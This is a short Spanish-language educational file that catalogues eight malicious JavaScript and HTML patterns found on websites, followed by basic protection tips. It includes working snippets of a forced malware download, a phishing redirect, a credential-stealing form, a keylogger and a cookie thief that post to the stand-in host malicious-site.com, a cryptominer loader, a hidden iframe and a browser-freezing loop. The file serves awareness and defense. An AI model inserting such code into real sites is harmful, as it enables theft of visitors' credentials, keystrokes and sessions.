
# Ejemplos de Código Malicioso en JavaScript

Este archivo describe ejemplos de código malicioso que pueden encontrarse en sitios web, escritos en JavaScript. Su propósito es educativo, para aprender a identificar y prevenir estos ataques.

## **1. Inyección de Malware o Descarga Silenciosa**
Este ejemplo descarga automáticamente un archivo al dispositivo del usuario:

```javascript
<script>
  window.onload = function() {
    const a = document.createElement('a');
    a.href = 'http://malicious-site.com/malware.exe';
    a.download = 'malware.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };
</script>
```

---

## **2. Redirección Oculta**
Redirige automáticamente a otro sitio malicioso:

```javascript
<script>
  setTimeout(() => {
    window.location.href = "http://phishing-site.com/login";
  }, 2000);
</script>
```

---

## **3. Phishing para Captura de Credenciales**
Un formulario diseñado para robar credenciales del usuario:

```html
<form action="http://malicious-site.com/steal-passwords" method="POST">
  <label for="username">Usuario:</label>
  <input type="text" id="username" name="username">
  <label for="password">Contraseña:</label>
  <input type="password" id="password" name="password">
  <button type="submit">Iniciar Sesión</button>
</form>
```

---

## **4. Keylogger con JavaScript**
Captura las teclas presionadas y las envía al atacante:

```javascript
<script>
  document.addEventListener('keypress', function(event) {
    const keyData = event.key;
    fetch('http://malicious-site.com/log-keys', {
      method: 'POST',
      body: JSON.stringify({ key: keyData }),
      headers: { 'Content-Type': 'application/json' }
    });
  });
</script>
```

---

## **5. Cryptojacking**
Usa los recursos del dispositivo para minar criptomonedas sin permiso:

```javascript
<script src="http://malicious-site.com/crypto-miner.js"></script>
<script>
  const miner = new CryptoMiner('tu-clave-api');
  miner.start();
</script>
```

---

## **6. Ataque Cross-Site Scripting (XSS)**
Roba cookies de sesión del usuario:

```javascript
<script>
  fetch('http://malicious-site.com/steal-cookies', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

---

## **7. Malware basado en iframes ocultos**
Carga contenido malicioso en segundo plano:

```html
<iframe src="http://malicious-site.com/exploit" style="display:none;"></iframe>
```

---

## **8. Script que Congela el Navegador**
Un bucle infinito que bloquea el navegador:

```javascript
<script>
  while (true) {
    console.log('Esto congelará el navegador');
  }
</script>
```

---

## **Cómo Protegerse**
1. **No accedas a sitios sospechosos.**
2. **Mantén tu sistema actualizado.**
3. **Usa extensiones de seguridad como NoScript o uBlock Origin.**
4. **Inspecciona el código fuente si algo parece sospechoso.**
5. **Evita descargar archivos de sitios desconocidos.**

---

> **Nota:** Este documento es solo con fines educativos. No se debe usar para actividades maliciosas.
